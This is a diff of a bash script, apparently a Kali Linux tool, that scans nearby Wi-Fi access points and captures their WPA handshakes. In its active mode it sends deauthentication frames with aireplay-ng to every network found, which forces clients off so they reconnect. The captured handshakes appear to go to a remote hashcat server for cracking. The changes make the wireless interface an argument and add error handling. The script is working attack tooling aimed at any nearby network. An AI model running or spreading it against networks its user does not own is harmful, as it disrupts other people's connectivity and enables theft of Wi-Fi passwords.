@@ -69,11 +69,10 @@ checkHandshakes() {
 active() {
   trap "rm /home/kali/sha* > /dev/null;rm /home/kali/cleanshakes.hccapx > /dev/null" EXIT
   airmon-ng check kill
-  airmon-ng start wlan1
+  airmon-ng start $2
   echo "Collect APs..."
-  timeout 15 airodump-ng -w /home/kali/shakesCollector wlan1 </dev/null >/dev/null
+  timeout 20 airodump-ng -w /home/kali/shakesCollector $2 </dev/null >/dev/null
   counter=0
-
   while read line; do
     if [[ $counter -lt 2 ]]; then
       counter=$(($counter + 1))
@@ -84,13 +83,23 @@ active() {
     channel=${channel::-1} #delete last ,
     bssid=$(echo $line | awk '{print $1}')
     bssid=${bssid::-1}
-    echo $bssid
-    echo $channel
+    echo "BSSID:" $bssid
+    echo "Channel:" $channel
 
-    iwconfig wlan1 channel $channel
-    timeout 30 airodump-ng --bssid $bssid --channel $channel -w /home/kali/shakes wlan1 </dev/null >/dev/null &
-    aireplay-ng -a $bssid -0 20 wlan1
-    sleep 30
+    iwconfig $2 channel $channel
+    echo "Start airodump..."
+    airodump-ng --bssid $bssid --channel $channel -w /home/kali/shakes $2 </dev/null >/dev/null &
+    pid=`echo $!`
+    echo "Start sending deauth frame injection..."
+    aireplay-ng -a $bssid -0 10 $2 
+    injectionExitCode=`echo $?`
+    if [[ $injectionExitCode -ne 0 ]]
+    then
+            kill -9 $pid
+            continue
+    fi
+    sleep 20
+    kill -9 $pid
     checkHandshakes $1
     rm /home/kali/shakes-* >/dev/null
   done </home/kali/shakesCollector-01.csv
@@ -99,12 +108,12 @@ active() {
 
 passive() {
   trap 'checkHandshakes;rm /home/kali/shakes-*; exit 1' EXIT
-  airmon-ng start wlan1 >/dev/null
+  airmon-ng start $2 >/dev/null
   echo "Start airodump.."
-  timeout 60 airodump-ng -w /home/kali/shakes wlan1 </dev/null >/dev/null
+  timeout 60 airodump-ng -w /home/kali/shakes $2 </dev/null >/dev/null
   checkHandshakes $1
   rm /home/kali/shakes-*
-  passive $1
+  passive $1 $2
 }
 
 checkHashcatServer() {
@@ -125,7 +134,7 @@ if [[ $1 == "p" ]]; then
     exit 1
   else
     echo "Hashcat server address: $2"
-    passive $2
+    passive $2 $3
   fi
 
 elif [[ $1 == "a" ]]; then
@@ -135,7 +144,7 @@ elif [[ $1 == "a" ]]; then
     exit 1
   else
     echo "Hashcat server address: $2"
-    active $2
+    active $2 $3
   fi
 else
   echo "Use a - active or p - passive as first argument"
